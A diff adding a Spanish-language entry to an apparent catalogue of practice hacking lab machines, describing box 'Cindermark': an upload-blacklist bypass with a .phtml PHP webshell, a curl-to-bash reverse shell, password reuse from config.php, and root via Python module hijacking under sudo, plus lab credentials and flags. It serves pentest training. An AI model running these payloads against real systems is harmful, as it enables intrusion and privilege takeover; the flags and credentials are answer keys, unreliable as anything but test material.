@@ -1077,6 +1077,81 @@ noise:
 
 ---
 
+## Box 15 — `Cindermark`
+
+```
+id: 15
+name: Cindermark
+os: linux
+difficulty: medium
+est_time: 45-75 min
+tags: [web, upload, extension-bypass, phtml, password-reuse, sudo, python-module-hijacking]
+
+target_ip: 10.10.14.130
+tun0_ip: 10.11.0.7
+
+services:
+  22: OpenSSH 8.9p1
+  80: Apache 2.4.52 + PHP — "Cindermark Gallery" (upload de imágenes a /uploads/)
+
+surface:
+  - /upload.php guarda en /uploads/ (accesible). Valida extensión por BLACKLIST (php/php3/php4/php5/pht...) mirando la última extensión.
+  - deja pasar .phtml (Apache lo ejecuta como PHP). .phar sube pero no ejecuta.
+
+chain:
+  - step: foothold-upload-phtml
+    trigger: upload con blacklist de extensiones
+    technique: bypass de extensión -> webshell .phtml -> RCE
+    cheat_ref: [[02-web]] (upload bypass)
+    aha: blacklist casi siempre se deja .phtml (Apache lo corre). whitelist > blacklist.
+    expected_action: "subir shell.phtml (<?php system($_GET[cmd]);?>) -> /uploads/shell.phtml?cmd=id -> reverse (curl|bash url-encoded)"
+    hints:
+      - "bloquea php/php3/4/5 -> prueba otras extensiones que Apache ejecuta como PHP."
+      - ".phtml pasa y se ejecuta."
+      - "reverse: curl -G --data-urlencode 'cmd=curl http://IP/s.sh|bash' (url-encode el pipe)"
+    resultado: RCE www-data
+  - step: lateral-cred-reuse
+    trigger: www-data en webroot
+    technique: config.php con cred reutilizada
+    cheat_ref: [[claves]] (credential reuse)
+    aha: config.php -> DB pass reutilizada para elliot (comentario lo chiva)
+    expected_action: "cat config.php -> Sp4rk!Cinder2024 -> ssh elliot"
+    hints: ["lee configs antes de privesc", "config.php tiene la pass de BD", "reutilizada para elliot"]
+  - step: privesc-python-module-hijack
+    trigger: sudo NOPASSWD sobre python script
+    technique: Python module/library hijacking
+    cheat_ref: [[07-privesc-linux]] (Intérprete -> library hijacking)
+    aha: cleanup.py (root, no escribible) hace `import logutil` (módulo LOCAL) y /opt/maintenance/ es escribible por grupo staff (elliot) -> plantas logutil.py
+    expected_action: |
+      cat > /opt/maintenance/logutil.py <<'EOF'
+      import os
+      def log(msg=None): os.system('/bin/bash')
+      EOF
+      sudo /usr/bin/python3 /opt/maintenance/cleanup.py
+    hints:
+      - "no reescribes cleanup.py (root), pero mira QUÉ importa y el permiso del DIRECTORIO. 07-privesc."
+      - "import de módulo local + dir escribible = module hijacking (sys.path[0] = dir del script)."
+      - "planta logutil.py con una función log() que haga os.system('/bin/bash') (hay TTY por sudo)."
+    resultado: root
+
+creds:
+  - gallery : Sp4rk!Cinder2024   (config.php; reutilizada para elliot)
+  - elliot  : Sp4rk!Cinder2024   (SSH; user flag; grupo staff)
+
+flags:
+  user: 5a2c1f0938e7b4620a1d9c3f6b8e0247
+  root: 9f4b0c7215a6e830d1c47f9b2e6a5038
+
+noise:
+  - .phar sube pero Apache no lo ejecuta (callejón).
+  - config.php señala a elliot (cred reuse); SUID/caps estándar = baseline.
+  - error típico: no url-encodear el pipe del curl|bash; o intentar reescribir cleanup.py (root) en vez del módulo.
+```
+
+**Lección pedagógica:** **upload bypass** (blacklist deja `.phtml` → Apache lo ejecuta; whitelist>blacklist); cred reuse desde config; y **Python module hijacking** — `sudo python3 script.py` + el script hace `import <local>` desde un **dir escribible** (`sys.path[0]`) → plantas el módulo → root. 3er primo de `.so`/PATH hijacking.
+
+---
+
 ## 📈 Ideas de evolución (roadmap del proyecto)
 
 - Añadir cajas Windows (SeImpersonate → PrintSpoofer/GodPotato) y AD (roasting → DCSync) con el mismo esquema.
